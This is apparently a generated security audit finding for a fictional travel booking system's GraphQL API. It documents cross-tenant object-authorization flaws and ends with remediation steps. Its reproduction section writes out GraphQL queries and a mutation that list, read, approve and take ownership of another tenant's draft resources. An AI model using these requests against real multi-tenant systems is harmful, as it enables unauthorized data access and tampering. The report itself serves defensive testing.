## System

- System: SkyPort Global Distribution v4.8.5
- Domain: TRAVEL / GDS
- Example ID: GQL-0418
- Risk ID: RISK-GQL-418

## Findings

### 1. Pattern 10.5 — Approve Cross-Tenant Draft Travel Resource via `updateResource` (HAR Primary)

**Primary HAR attack**: The HAR shows `updateResource(id: "R-2418", input: {status: "approved", ownerId: "attacker-9d7574b8"})` from JWT `tenant-9d75`. Pattern 10.5 (Draft/Non-Published Resource Access): the attacker accesses a cross-tenant resource in draft/pending state and promotes it to "approved" — publishing another carrier or agency's unpublished GDS content without authorization.

**HAR evidence**: JWT `x-tenant-id: tenant-9d75`. Request: `updateResource(id: "R-2418", input: {status: "approved", ownerId: "attacker-9d7574b8"})`. Response: HTTP 200 OK with `"tenantId": "tenant-74b8"` — another carrier's draft GDS resource approved and ownership transferred.

**Travel/GDS impact**: `Resource` objects in a Global Distribution System may represent draft fare rules, unpublished booking configurations, or pending inventory allocations. Approving another carrier's draft fare rule prematurely can disrupt their pricing strategy, expose pre-launch pricing to competitors, or activate booking rules before their intended release date.

### 2. Draft Resource Enumeration via `listResources(status: "draft")` (Pattern 10.5 Discovery)

`listResources(status: "draft", tenantId: "tenant-74b8")` — enumerate all unpublished GDS resources for the target carrier before accessing or modifying them.

### 3. BOLA on `getResource` — Missing `tenant_id` Filter (RISK-GQL-418)

Section 4.0 (RISK-GQL-418): `getResource` lacks tenant check.

### 4. BOLA on `bulkResourceLookup` — No Per-ID Ownership Filter

Section 4.0: documented gap.

### 5. Redis Cache Without Tenant Dimension

Section 2.0: `resourceId`-only cache key.

## Evidence

- **HAR**: `updateResource(id: "R-2418", input: {status: "approved", ownerId: "attacker-9d7574b8"})` with `tenant-9d75` JWT → HTTP 200 with `tenantId: tenant-74b8`.
- **Section 5.0**: Pattern 10.5 — draft resource access and status promotion without ownership check.
- **Section 4.0 (RISK-GQL-418)**: `getResource` lacks tenant check.
- **Section 4.0**: `bulkResourceLookup` lacks per-ID filter.

## Reproduction

**Step 1 — Baseline:**

```graphql
query { getResource(id: "R-1418") { resourceId tenantId status data { sensitiveField } } }
```

Expected: `tenantId: "tenant-9d75"`.

**Step 2 — Draft enumeration across tenant (Pattern 10.5 discovery):**

```graphql
query { listResources(tenantId: "tenant-74b8", status: "draft") { resourceId tenantId status data { sensitiveField internalNotes } } }
```

**Step 3 — Approve cross-tenant draft GDS resource + transfer ownership (primary HAR attack):**

```graphql
mutation {
  updateResource(id: "R-2418", input: {
    status: "approved",
    ownerId: "attacker-9d7574b8"
  }) {
    resourceId status tenantId ownerId
  }
}
```

Expected secure: Mutation rejected — cross-tenant access blocked.  
Expected vulnerable: HTTP 200 — competitor carrier's draft GDS configuration published and ownership transferred.

**Step 4 — Read cross-tenant draft (RISK-GQL-418):**

```graphql
query { getResource(id: "R-2418") { resourceId tenantId status ownerId data { sensitiveField internalNotes } } }
```

**Step 5 — Bulk cross-tenant lookup:**

```graphql
mutation { bulkResourceLookup(ids: ["R-2418", "R-3418", "R-4418"]) { resourceId tenantId status data { sensitiveField } } }
```

## Remediation

- **Enforce cross-tenant check before `updateResource`**: verify `resource.tenantId == jwt.tenantId`.
- **Restrict status transitions**: `approved` state requires explicit workflow role and ownership verification.
- **Ignore client-supplied `tenantId` in `listResources`**.
- **Enforce `tenant_id` WHERE clause in `getResource`** (RISK-GQL-418).
- **Filter `bulkResourceLookup` by JWT `tenantId`**.
- **Add `tenantId` to Redis cache key**.
